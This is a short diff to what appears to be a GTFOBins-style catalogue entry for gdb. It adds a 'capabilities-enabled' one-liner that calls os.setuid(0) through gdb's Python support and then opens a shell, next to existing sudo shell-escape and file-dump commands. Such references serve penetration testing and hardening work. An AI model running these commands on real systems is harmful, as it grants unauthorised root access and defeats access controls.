@@ -12,4 +12,7 @@ functions:
         gdb -nx -ex "dump value $LFILE \"DATA\"" -ex quit
   sudo-enabled:
     - code: sudo gdb -nx -ex '!sh' -ex quit
+  capabilities-enabled:
+    - description: Only if it has been compiled with Python support.
+      code: ./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
 ---
